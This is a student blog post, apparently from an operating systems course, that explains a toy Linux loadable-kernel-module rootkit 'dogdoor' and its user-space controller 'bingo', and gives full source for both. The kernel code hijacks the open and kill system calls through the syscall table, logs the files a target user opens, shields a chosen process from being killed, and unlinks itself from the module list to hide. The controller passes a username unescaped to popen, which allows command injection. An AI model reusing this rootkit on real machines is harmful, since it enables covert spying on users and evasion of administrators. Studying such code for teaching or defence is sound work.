<!DOCTYPE html>
<html>

  <head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134826755-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134826755-1');
  </script>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>LKM Rootkit and User Appilcation Practice</title>
  <meta name="description" content="Practice Problem  Create a toy rootkit dogdoor.ko - three main functionalities  log the names of files that a user has accessed  prevent a kill to a specifie...">
  
  <meta name="author" content="Jinhyeok Jeong">
  <meta name="copyright" content="&copy; Jinhyeok Jeong 2022">
  

  <!-- External libraries -->
  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/monokai-sublime.min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/css/lightbox.css">

  <!-- Favicon and other icons (made with http://www.favicon-generator.org/) -->
  <link rel="shortcut icon" href="/assets/icons/favicon.ico" type="image/x-icon">
  <link rel="icon" href="/assets/icons/favicon.ico" type="image/x-icon">
  <link rel="apple-touch-icon" sizes="57x57" href="/assets/icons/apple-icon-57x57.png">
  <link rel="apple-touch-icon" sizes="60x60" href="/assets/icons/apple-icon-60x60.png">
  <link rel="apple-touch-icon" sizes="72x72" href="/assets/icons/apple-icon-72x72.png">
  <link rel="apple-touch-icon" sizes="76x76" href="/assets/icons/apple-icon-76x76.png">
  <link rel="apple-touch-icon" sizes="114x114" href="/assets/icons/apple-icon-114x114.png">
  <link rel="apple-touch-icon" sizes="120x120" href="/assets/icons/apple-icon-120x120.png">
  <link rel="apple-touch-icon" sizes="144x144" href="/assets/icons/apple-icon-144x144.png">
  <link rel="apple-touch-icon" sizes="152x152" href="/assets/icons/apple-icon-152x152.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/assets/icons/apple-icon-180x180.png">
  <link rel="icon" type="image/png" sizes="192x192"  href="/assets/icons/android-icon-192x192.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/icons/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="96x96" href="/assets/icons/favicon-96x96.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/icons/favicon-16x16.png">
  <link rel="manifest" href="/assets/icons/manifest.json">
  <meta name="msapplication-TileColor" content="#ffffff">
  <meta name="msapplication-TileImage" content="/assets/icons/ms-icon-144x144.png">
  <meta name="theme-color" content="#ffffff">

  
  <!-- Facebook OGP cards -->
  <meta property="og:description" content="Practice Problem  Create a toy rootkit dogdoor.ko - three main functionalities  log the names of files that a user has accessed  prevent a kill to a specifie..." />
  <meta property="og:url" content="https://zoomkoding.github.io" />
  <meta property="og:site_name" content="줌코딩의 코딩일기" />
  <meta property="og:title" content="LKM Rootkit and User Appilcation Practice" />
  <meta property="og:type" content="website" />
  <meta property="og:image" content="https://zoomkoding.github.io/assets/instacode.png" />
  <meta property="og:image:type" content="image/png" />
  <meta property="og:image:width" content="612" />
  <meta property="og:image:height" content="605" />
  

  
  <!-- Twitter: card tags -->
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="LKM Rootkit and User Appilcation Practice">
  <meta name="twitter:description" content="Practice Problem  Create a toy rootkit dogdoor.ko - three main functionalities  log the names of files that a user has accessed  prevent a kill to a specifie...">
  <meta name="twitter:image" content="https://zoomkoding.github.io/assets/instacode.png">
  <meta name="twitter:url" content="https://zoomkoding.github.io">
  

  

  <!-- Site styles -->
  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="https://zoomkoding.github.io/os/linux/2019/04/01/Linux-Kernel-Programming-2.html">
  <link rel="alternate" type="application/rss+xml" title="줌코딩의 코딩일기" href="https://zoomkoding.github.io/feed.xml" />
</head>


  <body>

    <header class="navigation" role="banner">
  <div class="navigation-wrapper">
    <a href="/" class="logo">
      
      <img src="/assets/Crewcials.jpeg" alt="줌코딩의 코딩일기">
      
    </a>
    <div class="nav-link new-blog outer">
      <button type="button" onclick="location.href='https://www.zoomkoding.com'">
        <div class="button-text">
          <img class="thumbnail" src="https://github.com/zoomKoding/zoomKoding.github.io/blob/source/zoomkoding-small.png?raw=true" alt="개발 블로그 테마 개발">
          <div class="label">
            <div class="name">zoomkoding.com</div>
            <div class="description">이전한 블로그로 이동하기</div>     
          </div>    
        </div>
         
      </button>
    </div>
  
    <nav role="navigation">
      <ul id="js-navigation-menu" class="navigation-menu show">
        
          
          <li class="nav-link"><a href="/about/">About</a>
          
        
          
        
          
        
          
        
          
          <li class="nav-link"><a href="/posts/">Posts</a>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        

        <li class="nav-link new-blog inner">
          <button type="button" onclick="location.href='https://www.zoomkoding.com'">
            <div class="button-text">
              <img class="thumbnail" src="https://github.com/zoomKoding/zoomKoding.github.io/blob/source/zoomkoding-small.png?raw=true" alt="개발 블로그 테마 개발">
              <div class="label">
                <div class="name">zoomkoding.com</div>
                <div class="description">이전한 블로그로 이동하기</div>     
              </div>    
            </div>
             
          </button>
        </li>
      </ul>
    </nav>
  </div>
</header>


    <div class="page-content">
        <div class="post">

<div class="post-header-container has-cover" style="background-image: url(/assets/instacode.png);">
  <div class="scrim has-cover">
    <header class="post-header">
      <h1 class="title">LKM Rootkit and User Appilcation Practice</h1>
      <p class="info">by <strong>줌코딩</strong></p>
    </header>
  </div>
</div>

<div class="wrapper">



<section class="post-meta">
  <div class="post-date">April 1, 2019</div>
  <div class="post-categories">
  in 
    
    <a href="/category/os">Os</a>, 
    
  
    
    <a href="/category/linux">Linux</a>
    
  
  </div>
</section>
<div class="coupang-partners">
  <div class="items">
    <iframe src="https://coupa.ng/cbvuWm" width="120" height="240" frameborder="0" scrolling="no" referrerpolicy="unsafe-url"></iframe>
    <iframe src="https://coupa.ng/cbvuuT" width="120" height="240" frameborder="0" scrolling="no" referrerpolicy="unsafe-url"></iframe>
    <iframe src="https://coupa.ng/cbvuYz" width="120" height="240" frameborder="0" scrolling="no" referrerpolicy="unsafe-url"></iframe>
    <iframe src="https://coupa.ng/cbvuZQ" width="120" height="240" frameborder="0" scrolling="no" referrerpolicy="unsafe-url"></iframe>
    <iframe src="https://coupa.ng/cbvu3h" width="120" height="240" frameborder="0" scrolling="no" referrerpolicy="unsafe-url"></iframe>
  </div>
</div>
<article class="post-content">
  <h2 id="practice-problem">Practice Problem</h2>
<ul>
  <li>Create a toy rootkit <strong>dogdoor.ko</strong> - three main functionalities</li>
  <li>log the names of files that a user has accessed</li>
  <li>prevent a kill to a specified process</li>
  <li>hide the dogdoor module from the module list</li>
  <li>create a text interface /proc/dogdoor</li>
  <li>Create a user-level program <strong>bingo.c,</strong> a CLI with the dogdoor module</li>
</ul>

<h2 id="1-introduction">1. Introduction</h2>

<p><strong>1.1 The Dual Mode Operations</strong></p>

<p>As we have learned in the course, operating systems work in dual-mode or more. Usually, the mode is divided into two, user and kernel mode. For user applications, all the process runs in user mode, which means that a limited set of instructions is allowed.
When a user application requests a service from the operating system with a system call, an interrupt occurs, the system transitions from user to kernel mode. In the kernel mode OS gain the control of the computer. The system fulfills the requests of the user application. Within the dual mode, operating systems gain reliability and security.</p>

<p><strong>1.2 What is Loadable Kernel Modules(LKM)?</strong></p>

<p>The Loadable Kernel Modules(LKM) are modules that can be loaded and unloaded into the kernel. The LKM can provide additional functionalities to the kernel and even control the original functionalities in the kernel. In the kernel, there is a list of system calls that handle each interrupts. By the LKM, we can intercept a system call and give extra work for the kernel to do.
Without using the LKM, the kernel needs lots of memory space since it has to take care of all the drives. Moreover, the kernel has to be rebooted to rebuild every time a hardware is added or a driver is updated.
In this project, we practiced to create a LKM rootkit(<strong>dogdoor.ko</strong>) and a user application(<strong>bingo.c</strong>) that utilizes the functions of the LKM.</p>

<h2 id="2-how-to-interact-between-user-program-and-lkm">2. How to Interact between User Program and LKM</h2>

<p><strong>2.1 Proc Interface</strong></p>

<p>The proc Virtual file system where files act as agents for a kernel data structure or kernel module to interact with user-level programs. It provides the internal kernel information as a file system to users.
When the module is loaded, the proc interface is created as a file to /proc. This can be read and written by users and the kernel. It can work as a communication bridge between Bingo and Dogdoor.</p>

<p><strong>2.2 Command Line Interface(CLI) Program using C</strong></p>

<p>For Bingo to access /proc/dogdoor, Bingo should know where the dogdoor is and what to get from or put into the house. To let him know, we use the CLI program with bingo.c. When the object is created, we pass some valuable information as parameters.
For bingo, we give two parameters, as ‘./bingo [first][second].’</p>

<ul>
  <li>First : Work that Bingo can do</li>
  <li>Second : Things to deliver</li>
</ul>

<p>The CLI usage can be seen with a command ‘./bingo help’.</p>

<p>Fig 1. The result of the command ‘./bingo help’</p>

<p><strong>2.3 What Bingo actually brings to the dogdoor</strong></p>

<p>Among the options that Bingo can do, ‘stalker’(not ‘stalker [username]’) does not have to write anything to the /proc/dogdoor. Other options need writing, which can be confusing to the dogdoor as it does not know what to do with the information. It means that Bingo has to specify what to do.
Therefore, I give a distinctive number for stalker, nokill and toggle.</p>

<ul>
  <li>Stalker = 1</li>
  <li>Nokill = 2</li>
  <li>Toggle = 3</li>
</ul>

<p>The second parameter such uid found by the username and pid will be passed with the work number at the end. I chose to pass the information as an integer type as it is easy to be parsed.
For example, if the command is ‘./bingo nokill 13535,’ then the actual data passed is ‘135352’ as 2 specifies the work for ‘nokill’.</p>

<p><strong>2.4 Interaction by unbuffered I/O methods</strong></p>

<p>Unbuffered I/O methods directly executes system calls inside the kernel by a function call. It sends out the file descriptor as parameter that enables operations. I chose these methods to read and write the proc file.
Bingo opened the proc file, ‘/proc/dogdoor’ with open() and parameter O_RDWR which allows writing and reading. When it requires reading the file, it calls read() method and write() method for writing.</p>

<h2 id="3-how-dogdoor-works">3. How Dogdoor works</h2>

<p><strong>3.1 Stalker (Log the file list of the given username)</strong></p>

<p>As the given source code, ‘openhook.c,’ it is allowed to intercept the system call by linking my own method to specific system call. Therefore, every time an open system call is invoked, ‘dogdoor_sys_open,’ method is called. 
In this method, it receives the ‘filename’ and ‘uid.’ If the uid is same as the saved uid, then ‘filename’ is added to ‘filelist.’ The ‘filelist’ has 10 slots to put. It has a ‘count’ variable which tells the index of array to put. When the count goes over 10, it go backs to 0, it starts overwriting the ‘filelist.’
When the user requests by reading the ‘/proc/dogdoor,’ it returns the filelist backward from the current count, which works like ‘First-In-Last-Out.’</p>

<p><strong>3.2 PID Savior</strong></p>

<p>To save a PID from killing, I have approached with the similar pattern of the stalker. I searched for ‘sys_kill’ index of the system call list. Then, I need to know the original ‘sys_kill’ method’s parameter to write my own kill method. Searching in the ‘elixir.bootlin.com,’ I could find the method prototype.</p>

<p>When ‘sys_kill’ is invoked, the pid is compared with the ‘saved_pid.’ It returns -1 when the pid is equal to the saved one. Otherwise, the original ‘sys_kill()’ is executed.</p>

<p><strong>3.3 Hiding and Showing the Module</strong></p>

<p>The idea of hiding and showing the module seems to be easy at first. If I know the array of the loaded modules, then I can remove the module from the list and add back to the list. However, I could not find the list name. The linked list in Kernel is strange at first.</p>

<p>The linked list in Kernel is weird because we put list node inside the data. It is confusing that there it seems not to have a way to reach the data. As it has two headed list, ‘prev’ and ‘next,’ the erasing was easy with ‘list_del’ method.</p>

<p>However, to add the module back to the list, it has to remember the head of the list. I made a global variable that remembers the ‘prev’ list of ‘THIS_MODULE.’ That way, there is no need for the listname for adding since I can reconnect ‘THIS_MODULE’s list to the remembered ‘prev’ list.
The Boolean type variable, ‘hidden,’ works as a switch to hide and show the module on the list.</p>

<h2 id="source-code">Source Code</h2>

<p><strong>bingo.c</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;

//for showing the help message
void printhelp(){
  printf("\n&lt;help&gt;\nThe Greatest Dogdoor using the Lodable Kernel Module(LKM) \n");
  printf("Options:\n\tstalker \t\t: Print out files the specified user has been visited\n\tstalker [username] \t: Specify the user to stalk\n\tnokill [pid] \t\t: Prevent a process from killing\n\ttoggle \t\t\t: Toggle hiding and showing the dogdoor from the list\n");
}

int main(int argc, char *argv[]) {
  char buf[300];
  int fd = open("/proc/dogdoor", O_RDWR);
  //if the first parameter is not given
  if(argv[1] == NULL) printhelp();

  //if the first parameter is "stalker"
  else if(strcmp(argv[1], "stalker") == 0){
    if(argv[2] == NULL){
      read(fd, buf, 300);
      puts(buf);
    }
    else{
      //search uid with the argv[2] by a command id -u [username]
      char search[100] = "id -u ";
      strcat(search, argv[2]);

      //write the result to a file pointer
      char uid[100];
      FILE *p = popen(search, "r");

      //get the uid from the pointer
      if(p != NULL) {
       while(fgets(uid, sizeof(uid), p) != NULL);
      }

      //if the uid exists start stalking
      if(uid[0] &lt; 58 &amp;&amp; uid[0] &gt; 47){
        printf("Start stalking %s.\n", argv[2]);
        int i = 0;
        while(1){
          if(uid[i] == '\n'){
            //uid + '1'
            uid[i] = 49;
            break;
          }
          i++;
        }
        //write the uid+'1' to /proc/dogdoor
        write(fd, uid, strlen(uid));
      }

    }
  }

  //if the first parameter is "nokill"
  else if(strcmp(argv[1], "nokill") == 0){
    if(argv\[2\][0]-'0'== 0) printf("nokill disabled.\n");
    else printf("Prevent pid %s from killing.\n ", argv[2]);
    //pid + '2'
    strcat(argv[2], "2");
    //write the pid +'2' to /proc/dogdoor
    write(fd, argv[2], strlen(argv[2]));
  }

  //if the first parameter is "toggle"
  else if(strcmp(argv[1], "toggle") == 0){
    printf("toggle hiding and showing the backdoor module.\n");
    //write '3' to /proc/dogdoor
    write(fd, "3", 5);
  }

  //if the first paramter is "help"
  else if(strcmp(argv[1], "help") == 0) printhelp();

  //other cases will be showing the alert message and help message
  else{
    printf("\nCommand not found. Check the manual below.\n\n");
    printhelp();

  }
  close(fd);

  return 0;

}
</code></pre></div></div>

<p><strong>dogdoor.c</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;linux/syscalls.h&gt;
#include &lt;linux/module.h&gt;
#include &lt;linux/proc_fs.h&gt;
#include &lt;linux/seq_file.h&gt;
#include &lt;linux/uaccess.h&gt;
#include &lt;linux/kallsyms.h&gt;
#include &lt;linux/init.h&gt;
#include &lt;linux/kernel.h&gt;
#include &lt;asm/unistd.h&gt;
#include &lt;linux/cred.h&gt;
#include &lt;linux/sched.h&gt;


MODULE_LICENSE("GPL");

char filepath[128] = { 0x0, } ;
char filelist\[10\][128] = { {0x0, } };
void ** sctable ;
int count = 0 ;
int saved_uid = -1;
long saved_pid = -1;
bool hidden = false;
struct list_head* head;
asmlinkage long (*orig_sys_kill)(pid_t pid, int sig) ;
asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ;

//when the system call kill is intercepted
asmlinkage long dogdoor_sys_kill(pid_t pid, int sig) {
        //if the pid is same as the saved one, it will return -1.
        if(pid == saved_pid) return -1;
        //otherwise, original system call is executed
        return orig_sys_kill(pid, sig);
}

//when the system call open is intercepted
asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t mode)
{
        char fname[256];
        //copy filename to fname
        copy_from_user(fname, filename, 256);

        //print the log of the current file accessed
        printk("%d : %s", current-&gt;cred-&gt;uid.val, fname);

        //if the uid is same as the saved uid, then put the filename to the filelist
        if(saved_uid - current-&gt;cred-&gt;uid.val == 0 &amp;&amp; fname[0] != 0x0){
                strcpy(filelist[count], fname);
                count ++;
                if(count == 10) count = 0;
        }
        //go back to the original system call
        return orig_sys_open(filename, flags, mode) ;
}


static
int dogdoor_proc_open(struct inode *inode, struct file *file) {
        return 0 ;
}

static
int dogdoor_proc_release(struct inode *inode, struct file *file) {
        return 0 ;
}

static
ssize_t dogdoor_proc_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset)
{
        char buf[900] ;
        ssize_t toread ;
        int j = 0;
        j = sprintf(buf, "uid : %d\n", saved_uid);
        //if the uid is not specified yet
        if(saved_uid == -1){
                j+= sprintf(buf, "uid is not specified.\n");
        }

        //if the uid is specified, print the recent 10 files that the user has accessed
        else{
                int i = 0;
                for(i = 0; i &lt; 10; i ++){
                        if(--count == -1)count = 9;
                        j += sprintf(buf + j, "[%d] %s\n", i+1, filelist[count]);
                }
        }

        toread = strlen(buf) &gt;= *offset + size ? size : strlen(buf) - *offset ;

        if (copy_to_user(ubuf, buf + *offset, toread))
                return -EFAULT ;

        *offset = *offset + toread ;

        return toread ;
}

static
ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset)
{
        char buf[128] ;
        if (*offset != 0 || size &gt; 128)
                return -EFAULT ;

        /*        bingo will give a command as an integer
        *                the command will be like \[param\][cs]
        *                for example, the command 10001 has 1000 as param and 1 as cs
        *                (cs) 1 : stalker, 2 : nokill, 3 : toggle
        */
        int command = 0;
        int cs = -1 ;
        int param = -1;

        if (copy_from_user(buf, ubuf, size))
                return -EFAULT ;

        //get the input as integer type command
        sscanf(buf, "%d", &amp;command);

        cs = command%10;
        param = command/10;

        //stalker gets the uid
        if(cs == 1)        saved_uid = param;

        //pid savior starts working
        else if(cs == 2){
                if(param == 0) saved_pid = -1;
                saved_pid = param;
        }

        //toggle hiding and showing a module to the list
        else if(cs == 3){
                //if hidden, read the module to the head
                if(hidden) list_add_tail(&amp;THIS_MODULE-&gt;list, head);
                //else save the head and remove the module from the list
                else{
                        head = THIS_MODULE-&gt;list.prev;
                        list_del(&amp;THIS_MODULE-&gt;list);
                }
                //toggle
                hidden = !hidden;
        }


        *offset = strlen(buf) ;

        return *offset ;
}

static const struct file_operations dogdoor_fops = {
        .owner =         THIS_MODULE,
        .open =         dogdoor_proc_open,
        .read =         dogdoor_proc_read,
        .write =         dogdoor_proc_write,
        .llseek =         seq_lseek,
        .release =         dogdoor_proc_release,
} ;

static
int __init dogdoor_init(void) {
        unsigned int level ;
        pte_t * pte ;

        proc_create("dogdoor", S_IRUGO | S_IWUGO, NULL, &amp;dogdoor_fops) ;

        //get the system call table to intercept
        sctable = (void *) kallsyms_lookup_name("sys_call_table") ;

        //save the original system call for open and kill
        orig_sys_open = sctable[__NR_open] ;
        orig_sys_kill = sctable[37];

        pte = lookup_address((unsigned long) sctable, &amp;level) ;
        if (pte-&gt;pte &amp;~ _PAGE_RW)
                pte-&gt;pte |= _PAGE_RW ;

        //intercept the call to my custmized functions
        sctable[__NR_open] = dogdoor_sys_open ;
        sctable[37] = dogdoor_sys_kill ;

        return 0;
}

static
void __exit dogdoor_exit(void) {
        unsigned int level ;
        pte_t * pte ;
        remove_proc_entry("dogdoor", NULL) ;

        //return the original system calls
        sctable[__NR_open] = orig_sys_open ;
        sctable[37] = orig_sys_kill ;

        pte = lookup_address((unsigned long) sctable, &amp;level) ;
        pte-&gt;pte = pte-&gt;pte &amp;~ _PAGE_RW ;

}

module_init(dogdoor_init);
module_exit(dogdoor_exit);
</code></pre></div></div>


</article>
<div class="coupang-partners">
  <div class="items">
    <iframe src="https://coupa.ng/cbvuWm" width="120" height="240" frameborder="0" scrolling="no" referrerpolicy="unsafe-url"></iframe>
    <iframe src="https://coupa.ng/cbvuuT" width="120" height="240" frameborder="0" scrolling="no" referrerpolicy="unsafe-url"></iframe>
    <iframe src="https://coupa.ng/cbvuYz" width="120" height="240" frameborder="0" scrolling="no" referrerpolicy="unsafe-url"></iframe>
    <iframe src="https://coupa.ng/cbvuZQ" width="120" height="240" frameborder="0" scrolling="no" referrerpolicy="unsafe-url"></iframe>
    <iframe src="https://coupa.ng/cbvu3h" width="120" height="240" frameborder="0" scrolling="no" referrerpolicy="unsafe-url"></iframe>
  </div>
  <div class="description">
    이 포스팅은 쿠팡 파트너스 활동의 일환으로, 이에 따른 일정액의 수수료를 제공받습니다.
  </div>
</div>
<script type="text/x-mathjax-config">
MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}});
</script>
<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
</script>




<section class="tags">
  <strong>Tags:</strong> <a href="/tag/linux">linux</a>
</section>



<section class="rss">
  <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
</section>

<section class="share">
  <span>Share: </span>
  
    
    
    
    
    
    
    
    
  
</section>

	<section class="post-navigation">
		<span class="prev-post">
			
				<a href="/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/2019/03/28/sorting-2.html">
					<span class="fa-stack fa-lg">
						<i class="fa fa-square fa-stack-2x"></i>
						<i class="fa fa-angle-double-left fa-stack-1x fa-inverse"></i>
					</span>
					<span class="page-number">(프로그래머스 코딩테스트 고득점 kit) 정렬 Level1 가장큰수</span>
				</a>
			
		</span>
		<span class="next-post">
			
				<a href="/os/2019/04/01/os-1.html">
					<span class="page-number">(OS 기본개념 정리) CH1 컴퓨터 구조</span>
					<span class="fa-stack fa-lg">
						<i class="fa fa-square fa-stack-2x"></i>
						<i class="fa fa-angle-double-right fa-stack-1x fa-inverse"></i>
					</span>
				</a>
			
		</span>
	</section>




<section class="disqus">
  <div id="disqus_thread"></div>
  <script type="text/javascript">
    var disqus_shortname = 'zoomKoding';

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
  </script>
  <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
  <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</section>



</div>
</div>
    </div>

    <footer class="site-footer">

  <div class="wrapper">

    <h3 class="footer-heading">줌코딩의 코딩일기</h3>

    <div class="site-navigation">

      <p><strong>Site Map</strong></p>
      <ul class="pages">
        
        
          <li class="nav-link"><a href="/about/">About</a>
        
        
        
        
        
        
        
        
        
          <li class="nav-link"><a href="/posts/">Posts</a>
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
      </ul>
    </div>

    <div class="site-contact">

      <p><strong>Contact</strong></p>
      <ul class="social-media-list">
        <li>
          <a href="mailto:zoomkoding@gmail.com">
            <i class="fa fa-envelope-o"></i>
            <span class="username">zoomkoding@gmail.com</span>
          </a>
        </li>

        
          
          <li>
            <a href="https://github.com/zoomkoding" title="Fork me on GitHub">
              <i class="fa fa-github"></i>
              <span class="username">ZoomKoding</span>
            </a>
          </li>
          
        

      </ul>
    </div>

    <div class="site-signature">
      <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
      <p class="text">Zoom in Coding from the Basic.</p>
    </div>

  </div>

</footer>

<!-- Scripts -->
<script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
<style>
.videoWrapper {
	position: relative;
	padding-bottom: 56.333%;
	height: 0;
    background: black;
}
.videoWrapper iframe {
	position: absolute;
	top: 0;
	left: 0;
	width: 100%;
	height: 100%;
    border: 0;
}    
</style>

<script>
function get_youtube_id(url) {
    var p = /^(?:https?:\/\/)?(?:www\.)?(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=))((\w|-){11})(?:\S+)?$/;
    return (url.match(p)) ? RegExp.$1 : false;
}
function vimeo_embed(url,el) {
    var id = false;
    $.ajax({
      url: 'https://vimeo.com/api/oembed.json?url='+url,
      async: true,
      success: function(response) {
        if(response.video_id) {
          id = response.video_id;
          if(url.indexOf('autoplay=1') !== -1) var autoplay=1; else var autoplay=0;
          if(url.indexOf('loop=1') !== -1) var loop=1; else var loop=0;
          var theInnerHTML = '<div class="videoWrapper"><iframe src="https://player.vimeo.com/video/'+id+'/?byline=0&title=0&portrait=0';
          if(autoplay==1) theInnerHTML += '&autoplay=1';
          if(loop==1) theInnerHTML += '&loop=1';
          theInnerHTML += '" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe></div>'; 
          el.innerHTML = theInnerHTML;
        }
      }
    });
}
function video_embed() {
    var p = document.getElementsByTagName('p');
    for(var i = 0; i < p.length; i++) {
        //check if this is an external url (that starts with https:// or http://
        if (p[i].innerHTML.indexOf("http://") == 0 ||
            p[i].innerHTML.indexOf("https://") == 0) {
            var youtube_id = get_youtube_id(p[i].innerHTML);
            if(youtube_id) {
                if(p[i].innerHTML.indexOf('autoplay=1') !== -1) var autoplay=1; else var autoplay=0;
                if(p[i].innerHTML.indexOf('loop=1') !== -1) var loop=1; else var loop=0;
                var theInnerHTML = '<div class="videoWrapper"><iframe width="720" height="420" src="https://www.youtube.com/embed/' + youtube_id + '?rel=0&showinfo=0';
                if(autoplay==1) theInnerHTML += '&autoplay=1';
                if(loop==1) theInnerHTML += '&loop=1&playlist='+youtube_id+'&version=3';
                theInnerHTML += '" frameborder="0" allowfullscreen></iframe></div>';
                p[i].innerHTML = theInnerHTML;
            }
            if(p[i].innerHTML.indexOf('vimeo.com') !== -1) {
                //ask vimeo for the id and place the embed
                vimeo_embed(p[i].innerHTML,p[i]);
            }
        }
    }
}
video_embed();

function mp3_embed() {
    var p = document.getElementsByTagName('p');
    for(var i = 0; i < p.length; i++) {
        if(p[i].innerHTML.indexOf('.mp3') !== -1) {
            var str = p[i].innerHTML.split('?');
            if(str.length == 1) str[1] = '';
            var str1 = str[1];
            str1 = str1.replace('&','').replace('&','');
            str1 = str1.replace('autoplay=1','').replace('autoplay=0','');
            str1 = str1.replace('loop=1','').replace('loop=0','');
            str1 = str1.replace('controls=0','').replace('controls=1','');

            if (str[0].lastIndexOf('.mp3', str[0].length - 4) === str[0].length - 4 && str1.length == 0) {
                if(str[1].indexOf('autoplay=1') !== -1) var autoplay=1; else var autoplay=0;
                if(str[1].indexOf('loop=1') !== -1) var loop=1; else var loop=0;
                if(str[1].indexOf('controls=0') !== -1) var controls=0; else var controls=1;
                var newInnerHTML = '<audio';
                if(autoplay==1) newInnerHTML += ' autoplay';
                if(loop==1) newInnerHTML += ' loop';
                if(controls==1) newInnerHTML += ' controls';
                newInnerHTML += '><source src="'+str[0]+'" type="audio/mpeg">Your browser does not support the audio element.</audio>';
                p[i].innerHTML = newInnerHTML;
            }
        }
    }
}
mp3_embed();
</script>
<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.5/highlight.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/js/lightbox.min.js"></script>

<script type="text/javascript">
$(document).ready(function() {
  // Default syntax highlighting
  hljs.initHighlightingOnLoad();

  // Header
  var menuToggle = $('#js-mobile-menu').unbind();
  $('#js-navigation-menu').removeClass("show");
  menuToggle.on('click', function(e) {
    e.preventDefault();
    $('#js-navigation-menu').slideToggle(function(){
      if($('#js-navigation-menu').is(':hidden')) {
        $('#js-navigation-menu').removeAttr('style');
      }
    });
  });
});

</script>




<!-- Google Analytics -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-83878761-1', 'auto');
  ga('send', 'pageview', {
    'page': '/os/linux/2019/04/01/Linux-Kernel-Programming-2.html',
    'title': 'LKM Rootkit and User Appilcation Practice'
  });
</script>



  </body>

</html>
